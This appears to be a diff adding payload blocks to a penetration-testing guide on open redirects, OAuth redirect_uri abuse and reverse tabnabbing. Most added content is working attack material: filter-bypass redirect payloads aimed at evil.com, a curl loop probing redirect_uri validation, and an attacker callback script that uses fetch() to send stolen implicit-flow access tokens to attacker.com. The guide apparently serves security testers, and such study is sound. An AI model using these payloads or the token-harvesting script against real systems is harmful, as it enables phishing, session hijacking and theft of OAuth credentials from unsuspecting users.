@@ -44,6 +44,14 @@ Require authenticated session context (`contextBoosts: [auth]`) for full impact 
 
 Test every redirect parameter systematically. Common parameter names:
 
+```
+?redirect=        ?redirect_uri=      ?redirect_url=     ?return=
+?returnTo=        ?return_to=         ?returnUrl=        ?next=
+?goto=            ?go=                ?url=              ?dest=
+?destination=     ?rurl=              ?r=                ?u=
+?continue=        ?callback=          ?forward=          ?link=
+?target=          ?to=                ?out=              ?view=
+```
 
 ### Detection Method
 
@@ -64,15 +72,45 @@ Test every redirect parameter systematically. Common parameter names:
 
 ### Server-Side Redirect (HTTP 3xx)
 
+```http
+GET /login?next=https://evil.com HTTP/1.1
+Host: target.com
+
+```
 
 Expected response:
+
+```http
+HTTP/1.1 302 Found
+Location: https://evil.com
+```
+
+```bash
+# Confirm without following the redirect first
+curl -sk -D - -o /dev/null "https://target.com/login?next=https://evil.com" | grep -i location
+```
 
 ### Client-Side Redirect (JavaScript)
 
 Response body contains:
 
+```html
+<script>
+window.location = "https://evil.com";
+// or: document.location.href = "..."; window.location.assign(...); location.replace(...)
+</script>
+```
+
 ### Meta Refresh Redirect
 
+```html
+<meta http-equiv="refresh" content="0;url=https://evil.com">
+```
+
+```bash
+# Detect meta-refresh redirects in the response body
+curl -sk "https://target.com/redirect?url=https://evil.com" | grep -i 'http-equiv="refresh"'
+```
 
 ## Filter Bypass Techniques
 
@@ -80,61 +118,139 @@ Response body contains:
 
 If the application strips `https://` but not `//`:
 
+```
+//evil.com
+//evil.com/path
+////evil.com
+```
+
+```http
+GET /login?next=//evil.com HTTP/1.1
+Host: target.com
+
+```
 
 Browser resolves `//evil.com` as `https://evil.com`.
 
 ### Subdomain Impersonation
 
+```
+https://target.com.evil.com/
+https://evil-target.com/           # prefix match on "target"
+https://target-com/                # dash confusion
+https://target.com%2fevil.com/
+```
 
 Some validations only check if the domain ends with `target.com`. Use attacker-controlled subdomain or DNS to resolve.
 
 ### Path Traversal with @ (Authority Confusion)
 
+```
+https://target.com@evil.com/
+https://target.com:secret@evil.com/
+```
 
 Parsed as: user `target.com`, host `evil.com`. Some URL parsers misinterpret this.
 
 ### Backslash Authority Confusion
 
+```
+https://target.com/\/evil.com
+https:\\evil.com
+/\//evil.com
+/\evil.com
+```
 
 Some URL parsers treat backslash as a path separator, causing the authority to shift to `evil.com`.
+
+```http
+GET /login?next=https://target.com%5c%5cevil.com HTTP/1.1
+
+<!-- Browsers (notably Chrome) normalize \ to / in the authority position → //evil.com -->
+```
 
 ### URL Encoding
 
 Encode the `//` prefix to bypass string-based filters:
 
+```
+%2f%2fevil.com
+https:%2f%2fevil.com
+https%3a%2f%2fevil.com
+/%2fevil.com
+```
 
 ### Double URL Encoding
 
 Encode the `%` character itself:
 
+```
+%252f%252fevil.com        # %252f -> %2f -> /
+https:%252f%252fevil.com
+%25252f%25252fevil.com    # triple, for double-decoding stacks
+```
 
 ### Backslash Path Traversal
 
+```
+https://target.com\evil.com
+/..\//evil.com
+//\evil.com
+```
 
 On some systems, backslash is treated as a path separator, redirecting to `evil.com`.
 
 ### Null Byte Injection
 
+```
+https://evil.com%00
+https://evil.com%00.target.com
+https://evil.com?x=%00
+```
 
 Older parsers may truncate at the null byte, treating the rest as invalid.
 
 ### DNS Name Variations
 
+```
+https://evil.com.                       # trailing dot — same host to resolvers
+https://0x7f000001/                     # hex IP form (if redirecting internally)
+https://2130706433/                     # decimal IP form
+https://evil.co.uk@evil.com/
+https://ⓔⓥⓘⓛ.com/                      # unicode circled letters normalize to "evil"
+```
 
 ### Parameter Pollution
 
 Send the same parameter twice with different values:
 
+```
+?next=https://target.com&next=https://evil.com
+?next=whitelist&next=https://evil.com
+?next[]=safe&next[]=//evil.com
+```
 
 Server may use the first value for validation and the last for the redirect.
 
 ### Tab and Newline Characters
 
+```
+https://ev%09il.com          # tab inside domain
+https://evil.com%0a
+https://evil.com%0dhttps://target.com
+java%0ascript:alert(1)
+```
 
 Some parsers ignore whitespace characters in the URL.
 
 ### Unicode and Special Characters
 
+```
+https://evil.com%E3%80%82            # ideographic full stop (。)
+https://％２ｆ％２fevil.com           # fullwidth percent/slash
+https://evil.com／                    # fullwidth solidus U+FF0F
+hTTps://Evil.COM/                     # scheme/host case confusion
+```
 
 Unicode normalization or homograph attacks can confuse domain validation.
 
@@ -150,8 +266,46 @@ Unicode normalization or homograph attacks can confuse domain validation.
 
 ### Exploitation Steps
 
+```http
+# Step 1: Discover the OAuth flow and its callback parameter
+GET /auth/start?client_id=abc&redirect_uri=https://target.com/callback HTTP/1.1
+
+# Step 2: Substitute an attacker-controlled redirect_uri
+GET /oauth/authorize?client_id=abc&response_type=code&redirect_uri=https://evil.com/callback HTTP/1.1
+
+# Step 3: Victim authenticates; provider redirects the code to the attacker
+HTTP/1.1 302 Found
+Location: https://evil.com/callback?code=AUTHORIZATION_CODE
+```
+
+```bash
+# Enumerate redirect_uri validation: try subpaths, subdomains, encodings
+for uri in "https://evil.com" "https://target.com.evil.com" "https://target.com@evil.com" \
+           "https://target.com/callback/../../evil" "//evil.com" "https://evil.com%2ftarget"; do
+  echo -n "$uri -> "
+  curl -sk -o /dev/null -w "%{http_code}\n" \
+    "https://provider.com/oauth/authorize?client_id=abc&response_type=code&redirect_uri=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$uri")"
+done
+```
 
 ### OAuth Provider Variations
+
+```http
+# Authorization Code Flow — steal the code from the query string
+Location: https://evil.com/callback?code=AUTH_CODE&state=xyz
+
+# Implicit Flow — token in the fragment (never sent to servers, read by JS)
+Location: https://evil.com/callback#access_token=AT-1234&token_type=bearer
+```
+
+```html
+<!-- Attacker callback page harvesting the implicit-flow fragment -->
+<script>
+if (location.hash) {
+  fetch('https://attacker.com/log?fragment=' + encodeURIComponent(location.hash));
+}
+</script>
+```
 
 - **Authorization Code Flow**: Steal `code` parameter from callback
 - **Implicit Flow**: Steal `access_token` from URL fragment (`#access_token=...`)
@@ -179,6 +333,18 @@ When a page opens a link with `target="_blank"` and `rel="opener"` (or no `rel`)
 
 Search response HTML for:
 
+```html
+<!-- VULNERABLE: no rel protection -->
+<a href="https://third-party.com" target="_blank">Partner</a>
+
+<!-- SAFE -->
+<a href="https://third-party.com" target="_blank" rel="noopener noreferrer">Partner</a>
+```
+
+```bash
+curl -sk https://target.com | grep -oE '<a [^>]*target="_blank"[^>]*>' | grep -v noopener
+```
+
 Missing `noopener` or `noreferrer` in `rel` attribute is vulnerable.
 
 ### Impact
@@ -192,9 +358,31 @@ Victim returns to the original tab expecting a legitimate site but sees a phishi
 
 ### Common Patterns
 
+```html
+<script>
+window.location = "https://evil.com";
+window.location.href = "https://evil.com";
+window.location.assign("https://evil.com");
+window.location.replace("https://evil.com");   // breaks back button
+document.location = "//evil.com";
+window.open("https://evil.com", "_self");
+</script>
+```
+
+```html
+<!-- DOM-based: user input flows into the sink -->
+<script>
+var url = new URLSearchParams(location.search).get('next');
+if (url) location = url;
+</script>
+```
 
 ### Meta Refresh
 
+```html
+<meta http-equiv="refresh" content="0;url=//evil.com">
+<meta http-equiv="refresh" content="5;url=https://evil.com/phish">
+```
 
 ### Evaluation in Sandboxed Contexts
 
